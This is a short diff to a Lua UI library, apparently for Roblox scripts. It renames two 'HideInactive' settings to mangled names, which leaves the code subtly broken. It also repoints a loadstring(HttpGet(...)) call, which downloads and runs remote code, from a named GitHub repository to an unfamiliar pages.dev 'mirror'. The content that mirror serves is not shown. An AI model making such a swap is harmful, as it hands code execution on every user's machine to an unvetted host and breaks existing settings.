@@ -68,9 +68,9 @@ local Library = {
     ShowCustomCursor = true,
     ForceCheckbox = false,
     ShowToggleFrameInKeybinds = true,
-    HideInactiveKeybinds = false,
+    HinactiveKeybinds = false,
     KeybindFrameEnabled = false,
-    HideInactiveStatus = false,
+    HinactiveStatus = false,
     StatusFrameEnabled = false,
     NotifyOnError = false,
 
@@ -514,7 +514,7 @@ function Library:UpdateKeybindFrame()
     end
 
     local shouldShow = Library.KeybindFrameEnabled
-    if Library.HideInactiveKeybinds and VisibleKeybindCount == 0 then
+    if Library.HinactiveKeybinds and VisibleKeybindCount == 0 then
         shouldShow = false
     end
 
@@ -1038,7 +1038,7 @@ end
 
 local FetchIcons, Icons = pcall(function()
     return loadstring(
-        game:HttpGet("https://raw.githubusercontent.com/deividcomsono/lucide-roblox-direct/refs/heads/main/source.lua")
+        game:HttpGet("https://upio-github-mirror.pages.dev/source.lua")
     )()
 end)
 function Library:GetIcon(IconName: string)
